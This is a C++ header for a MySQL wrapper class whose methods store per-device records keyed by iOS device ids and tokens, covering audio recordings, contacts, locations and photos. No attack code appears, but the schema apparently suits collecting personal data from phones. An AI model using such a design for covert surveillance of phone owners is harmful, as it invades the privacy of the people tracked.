#pragma once
#include <vector>
#include <iostream>
#include "include/mysql.h"

#pragma comment(lib,"lib/libmysql.lib")

using namespace std;

class MySql {
public:

	MySql();
	virtual ~MySql();
	static void initLock();
	static void enter();
	static void leave();

	void closeMySQL();
	bool connectMySQL(char* server, char* username, char* password, char* database, int port);
	bool createDatabase(std::string dbname);
	bool createdbTable(const std::string& query);
	void errorIntoMySQL();

	bool init();

	bool useDatabase(std::string dbname);
	string getIdFromUserName(string username);

	string getIdFromClient(string iosid);
	int insertClientByCmd(string username, string iosid);
	int insertClient(string id, string username, string iosid, string info, string token);

	string getidFromToken(string clientid, string token);
	int insertToken(string userid, string token);

	string getidFromAudio(string clientid, string filepath);
	int insertAudio(string userid, string filepath, int filesize);
	
	string getidFromContacts(string clientid, string username, string phone);
	int insertContacts(string userid, string username, string phone);

	string getidFromLocation(string clientid, string timestamp);
	int insertLocation(string userid, string locdesc, string x, string y, string timestr);

	string getidFromPhoto(string clientid, string filename);
	int insertPhoto(string userid, string type, string filepath);

	bool getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data);
	void recorderr();

public:
	int errorNum;                    //错误代号
	const char* errorInfo;             //错误提示

private:
	MYSQL mysqlInstance;                      //MySQL对象，必备的一个数据结构
	MYSQL_RES *result;                 //用于存放结果 建议用char* 数组将此结果转存
};